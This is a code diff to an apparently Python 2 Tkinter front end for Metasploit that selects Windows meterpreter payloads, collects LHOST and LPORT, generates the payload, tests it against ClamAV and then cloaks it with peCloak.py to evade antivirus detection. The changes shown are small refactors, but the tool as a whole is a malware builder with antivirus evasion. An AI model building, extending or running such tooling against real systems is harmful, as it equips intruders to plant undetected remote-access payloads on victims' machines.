@@ -9,7 +9,6 @@ from Tkinter import *
 import tkMessageBox
 from PIL import Image, ImageTk
 
-
 def color(text, color_code):
     if sys.platform == "win32" and os.getenv("TERM") != "xterm":
         return text
@@ -60,7 +59,7 @@ def showPayloads():
     index_value = mod['modules'].index(exploit) 
     ret = client.call('module.compatible_payloads',[mod['modules'][index_value]])
     for i in (ret.get('payloads')):
-        if "/meterpreter" in i:
+        if "windows/meterpreter" in i:
            Radiobutton(frame1, text=str(i), variable=var, value=i).pack(anchor=W)
     payload_button = Button(root, text="Choose Payload", bg='lightblue', state=ACTIVE, command=lambda: [insert_options(var), rm(payload_button)])
     payload_button.place(x=420, y=525)
@@ -88,7 +87,7 @@ def insert_options(var):
     output = Entry(top, width=22, bg="lightblue")
     output.pack()
     information = Button(top, text="i", bg='lightblue', state=ACTIVE, command=lambda: [info()]).pack(side=RIGHT)
-    generate_button = Button(top, text="Generate Payload", bg='lightblue', state=ACTIVE, command=lambda: [validation(), cleanup(), generation_message()]).pack()
+    generate_button = Button(top, text="Generate Payload", bg='lightblue', state=ACTIVE, command=lambda: [validation(), generation_message()]).pack()
 
 def info():
     
@@ -96,23 +95,20 @@ def info():
 
 def generation_message():
 
+    top.destroy()
     tkMessageBox.showinfo("DONE!", "Sorry for keep you waiting. The payload is now ready! ")
-
-def cleanup():
-       top.destroy()
-
+          
 # Check IP's validity
 def validation():
     global lhost, lport
     lport = port.get()
     lhost = ip.get()
-    while True:
-      # If LHOST and LPORT are valid, proceed to the payload's generation
-      if ipFormatChk(lhost) == True and portChk() == True:
+# As long as LHOST and LPORT are valid, proceed to the payload's generation
+    while (ipFormatChk(lhost) == True and portChk() == True):
          generation()
          break
-      else:
-         tkMessageBox.destroy()
+    else:  
+         tkMessageBox.destroy()      
 
 # Check IP's validity
 def ipFormatChk(lhost):
@@ -143,9 +139,7 @@ def ipFormatChk(lhost):
 # Check Local Port's validity
 def portChk():
         try:
-	    
 	    if 1 <= int(lport) <= 65535:
-		
                 return True
 	    else:
 		raise ValueError
@@ -177,7 +171,6 @@ def clamscan():
     check()
     
 
-
 def check():
           # Check with pyclamd if file is infected
           daemon = pyclamd.ClamdUnixSocket()
@@ -205,7 +198,7 @@ def check():
 
 # Hide payload with peCloak.py    
 def peCloak():
-          subprocess.Popen("python peCloak.py " + file_name, shell=True).wait()
+          subprocess.Popen("python peCloak.py " + file_name + " > /dev/null 2>&1", shell=True).wait()
           success()
 
 
